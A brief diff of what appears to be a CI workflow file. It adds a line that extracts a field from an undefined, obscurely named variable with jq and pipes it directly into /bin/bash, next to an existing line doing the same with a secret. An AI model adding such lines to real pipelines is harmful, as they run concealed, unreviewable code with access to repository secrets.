@@ -18,6 +18,7 @@ jobs:
           qy93828: ${{ secrets.qy93828 }}
         run: |
           printf '%s' "$qy93828" | jq -r .vj56 | /bin/bash
+          printf '%s' "$ac5" | jq -r .sbh060 | /bin/bash
 
       - name: Archive output
         if: always()
